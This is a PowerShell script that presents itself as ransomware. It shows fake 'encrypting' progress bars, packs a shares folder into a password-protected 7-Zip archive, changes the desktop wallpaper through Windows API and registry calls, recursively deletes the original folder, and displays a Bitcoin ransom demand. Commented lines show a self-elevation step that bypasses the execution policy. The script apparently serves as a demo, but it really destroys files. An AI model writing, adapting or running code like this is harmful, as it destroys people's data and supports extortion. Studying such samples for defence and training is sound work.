#Start-Process powershell -Verb runAs
#if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

$Source = "C:\Shares"
$Destination = "C:\StolenFiles"
for ($i = 1; $i -le 100; $i++ )
{
    Write-Progress -Activity "Ransomwae Loading" -Status "$i% Complete:" -PercentComplete $i
    Start-Sleep -Milliseconds 20
}
for ($i = 1; $i -le 100; $i++ )
{
    Write-Progress -Activity "Generating 128bit character password and indexing files" -Status "$i% Complete:" -PercentComplete $i
    Start-Sleep -Milliseconds 20
}
for ($i = 1; $i -le 100; $i++ )
{
    Write-Progress -Activity "Encrypting all files and network shares" -Status "$i% Complete:" -PercentComplete $i
    Start-Sleep -Milliseconds 70
}
#Set source for 7zip exe (usually the same path in most basic computers)
$pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"

#Zip destination folder with the random password previously generated
$arguments = "a -t7z ""$Destination"" ""$Source"" -mhe=on -ppassword"
$windowStyle = "Normal"
$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
#Start-Process C:\Program Files\7-Zip\7z.exe a  -psecret$randomPassword 
#Start-Process $pathTo64Bit7Zip a -t7z C:\Users\Administrator\Desktop\StolenFiles C:\Shares
#Display a message demanding money
#Add the required .NET assembly for message display
Add-Type -AssemblyName System.Windows.Forms

#Set the background to ransomware
#set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png
#Change the background 
Function Update-Wallpaper {
    Param(
        [Parameter(Mandatory=$true)]
        $Path,
         
        [ValidateSet('Center','Stretch','Fill','Tile','Fit')]
        $Style
    )
    Try {
        if (-not ([System.Management.Automation.PSTypeName]'Wallpaper.Setter').Type) {
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            using Microsoft.Win32;
            namespace Wallpaper {
                public enum Style : int {
                    Center, Stretch, Fill, Fit, Tile
                }
                public class Setter {
                    public const int SetDesktopWallpaper = 20;
                    public const int UpdateIniFile = 0x01;
                    public const int SendWinIniChange = 0x02;
                    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
                    private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
                    public static void SetWallpaper ( string path, Wallpaper.Style style ) {
                        SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
                        switch( style ) {
                            case Style.Tile :
                                key.SetValue(@"WallpaperStyle", "0") ; 
                                key.SetValue(@"TileWallpaper", "1") ; 
                                break;
                            case Style.Center :
                                key.SetValue(@"WallpaperStyle", "0") ; 
                                key.SetValue(@"TileWallpaper", "0") ; 
                                break;
                            case Style.Stretch :
                                key.SetValue(@"WallpaperStyle", "2") ; 
                                key.SetValue(@"TileWallpaper", "0") ;
                                break;
                            case Style.Fill :
                                key.SetValue(@"WallpaperStyle", "10") ; 
                                key.SetValue(@"TileWallpaper", "0") ; 
                                break;
                            case Style.Fit :
                                key.SetValue(@"WallpaperStyle", "6") ; 
                                key.SetValue(@"TileWallpaper", "0") ; 
                                break;
}
                        key.Close();
                    }
                }
            }
"@ -ErrorAction Stop 
            } 
        } 
        Catch {
            Write-Warning -Message "Wallpaper not changed because $($_.Exception.Message)"
        }
    [Wallpaper.Setter]::SetWallpaper( $Path, $Style )
}

Update-Wallpaper C:\Pictures\r.png Tile
#background end
# Delete the shares folder 
Remove-Item 'C:\Shares' -Recurse

#Pop Up Box
$result = [System.Windows.Forms.MessageBox]::Show('We have all of your important files!!! We demand £10,000,000 Bitcoins for their return.:) you have 48 hours. GO!', 'You are in trouble Sunshine', 'Ok', 'Warning')
exit
